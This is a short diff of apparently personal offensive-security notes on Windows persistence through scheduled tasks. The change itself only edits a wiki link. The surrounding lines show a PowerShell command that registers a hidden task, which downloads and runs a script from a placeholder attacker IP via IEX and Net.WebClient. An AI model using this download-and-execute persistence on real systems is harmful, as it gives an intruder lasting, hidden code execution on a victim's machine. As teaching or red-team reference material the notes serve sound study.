@@ -84,7 +84,7 @@ $settings = New-ScheduledTaskSettingsSet -RunOnlyIfNetworkAvailable -StartWhenAv
 Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "<task_name>"
 ```
 
-Let's use [[06 - Tactics & Techniques & Procedures (TTPs) Phases/C - Initial Access/0x01 - Weaponization/0xB - Client-Side Attacks/Delivery Methods/Command and Scripting Interpreter/Desktop/Windows/Code Execution/PowerShell|PowerShell]] as example.
+Let's use [[06 - Tactics & Techniques & Procedures (TTPs) Phases/C - Initial Access/0x01 - Weaponization/0xB - Client-Side Attacks/Delivery Methods/Command and Scripting Interpreter/Desktop/Windows/Code Execution/PowerShell/Manual|Manual]] as example.
 
 ```powershell
 PS C:\> $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle hidden -c `"IEX (New-Object Net.WebClient).DownloadString('http[s]://<attacker_IP>/payload.ps1')`""
